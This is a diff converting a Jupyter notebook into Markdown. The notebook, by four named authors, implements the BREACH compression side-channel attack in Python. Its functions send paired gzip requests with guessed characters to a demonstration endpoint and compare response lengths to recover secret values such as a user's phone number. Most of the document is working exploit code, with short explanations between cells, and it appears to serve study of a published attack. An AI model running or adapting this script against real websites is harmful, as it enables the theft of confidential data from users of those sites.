@@ -1,35 +1,28 @@
-#!/usr/bin/env python
-# coding: utf-8
+# BREACH Implementation
 
-# # BREACH Implementation
+### Authors
 
-# ### Authors
+* Miguel Enrile
+* Pedro Murcia
+* Luis Puyol
+* Iñigo Sagredo
 
-# * Miguel Enrile
-# * Pedro Murcia
-# * Luis Puyol
-# * Iñigo Sagredo
+This is a BREACH attack implementation in Python. It is not as optimized as it should be, but I wouldn't dare touch anything. The attack is fully detailed in the following URL: http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf
 
-# This is a BREACH attack implementation in Python. It is not as optimized as it should be, but I wouldn't dare touch anything.
-# The attack is fully detailed in the following URL: http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf
-# 
-# For this implementation, we will only use the *Huffman Coding and the Two-Tries Method* shown in the paper above to deduce the value of different variables.
-# It will be available in the following GitHub repo: https://github.com/pmurcia/BREACH
-
-# In[ ]:
+For this implementation, we will only use the *Huffman Coding and the Two-Tries Method* shown in the paper above to deduce the value of different variables.
+It will be available in the following GitHub repo: https://github.com/pmurcia/BREACH
 
 
+```python
 import requests
 import string
 from datetime import datetime
+```
+
+These are the target elements we want to hack. Each dictionary contains the name of the parameter and the format of the parameter, which is a string of possible characters. If the number of possibilities is lower, it will take less time to finish. All of them should technically work, but the first two have been tested and validated.
 
 
-# These are the target elements we want to hack. Each dictionary contains the name of the parameter and the format of the parameter, which is a string of possible characters.
-# If the number of possibilities is lower, it will take less time to finish. All of them should technically work, but the first two have been tested and validated.
-
-# In[ ]:
-
-
+```python
 targets = [
     {
         "name": "user_phone",
@@ -52,48 +45,43 @@ targets = [
         "format": string.ascii_letters + string.punctuation + string.digits + " "
     }
 ]
+```
+
+The following header must be added to the request to be able to exploit GZIP on the response.
 
 
-# The following header must be added to the request to be able to exploit GZIP on the response.
-
-# In[ ]:
-
-
+```python
 gzip_header = {'Accept-Encoding': 'gzip, deflate'}
+```
+
+We will also keep track of the number of requests done.
 
 
-# We will also keep track of the number of requests done.
-
-# In[ ]:
-
-
+```python
 total_requests = 0
+```
+
+In JavaScript, there are different ways to assign a value to a variable.
+1. **Number**. It will start with 0,1,2,3,4,5,6,7,8, or 9
+2. **String**. It will start with `'` or `"`
+3. **Object**. As JSON notation, `{}`
+4. **Array**. As JSON notation, `[]`
+5. **Boolean**. It has only two values, `true` or `false`
+6. **Null value**. Represented as `null`
+
+There are other types of assignments ($, variable name, or by object creation with `new`), but we will assume that those are the possible values.
+
+So the possible start characters are defined in a list. We will focus on the first four, since those provide more information.
 
 
-# In JavaScript, there are different ways to assign a value to a variable.
-# 1. **Number**. It will start with 0,1,2,3,4,5,6,7,8, or 9
-# 2. **String**. It will start with `'` or `"`
-# 3. **Object**. As JSON notation, `{}`
-# 4. **Array**. As JSON notation, `[]`
-# 5. **Boolean**. It has only two values, `true` or `false`
-# 6. **Null value**. Represented as `null`
-# 
-# There are other types of assignments ($, variable name, or by object creation with `new`), but we will assume that those are the possible values.
-# 
-# So the possible start characters are defined in a list. We will focus on the first four, since those provide more information.
-
-# In[ ]:
-
-
+```python
 first_chars = ['\'','"','{','[','t','f','n'] + list(string.digits)
+```
+
+The function `checkGuess()` will make requests to the website using the *Two-Tries Method* from before. After that, we will read the response content length, and we will have a candidate if both lengths are different.
 
 
-# The function `checkGuess()` will make requests to the website using the *Two-Tries Method* from before. After that, we will read the response content length,
-# and we will have a candidate if both lengths are different.
-
-# In[ ]:
-
-
+```python
 def checkGuess(target, guess, padding):
     r_1 = requests.get(f"http://malbot.net/poc/?id={target}={padding}{guess}", headers=gzip_header)
     l_1 = int(r_1.headers['Content-Length'])
@@ -112,14 +100,12 @@ def checkGuess(target, guess, padding):
         'min': min(l_1,l_2),
         'd': abs(l_1-l_2)
     }
+```
+
+The function `getGuesses()` will find the best options for the next character of the target string. In this case, the best options will be valid guesses (both response content lengths are different) whose minimum content length is the minimum of all guesses.
 
 
-# The function `getGuesses()` will find the best options for the next character of the target string. In this case, the best options will be valid guesses
-# (both response content lengths are different) whose minimum content length is the minimum of all guesses.
-
-# In[ ]:
-
-
+```python
 def getGuesses(target, chars, padding, guess = ''):
     # Finding by two-tries method
     result = map(lambda c: checkGuess(target, guess + c, padding), chars)
@@ -132,13 +118,12 @@ def getGuesses(target, chars, padding, guess = ''):
     result = [d for d in result if d['min'] == minimum]
 
     return result
+```
+
+`getEndChar` is just a switch-case to determine the last character of the target value.
 
 
-# `getEndChar` is just a switch-case to determine the last character of the target value.
-
-# In[ ]:
-
-
+```python
 def getEndChar(begin_char):
     if begin_char in ['\'','"']:
         return begin_char
@@ -152,13 +137,12 @@ def getEndChar(begin_char):
         return 'l'
     elif begin_char in list(string.digits):
         return ','
+```
+
+And finally, `findTarget()` is the responsible of iterating through all of the guesses to get the most likely result.
 
 
-# And finally, `findTarget()` is the responsible of iterating through all of the guesses to get the most likely result.
-
-# In[ ]:
-
-
+```python
 def findTarget(target, char_seq):
     guesses = getGuesses(target, first_chars, "{}")
 
@@ -187,13 +171,12 @@ def findTarget(target, char_seq):
         guesses = result
     
     return guesses
+```
+
+With all of that, we are ready to test the algorithm.
 
 
-# With all of that, we are ready to test the algorithm.
-
-# In[ ]:
-
-
+```python
 for target in targets:
     name = target['name']
     format_t = target['format']
@@ -212,16 +195,12 @@ for target in targets:
     total = d.total_seconds()
     minutes = total // 60
     seconds = total - minutes * 60
+    
+    global total_requests
 
     print(f"Guessed value of {name}: {guessed_value}")
     print(f"Total number of requests: {total_requests}")
     print(f"Time elapsed: {minutes} min {seconds} s")
     
     total_requests = 0
-
-
-# In[ ]:
-
-
-
-
+```
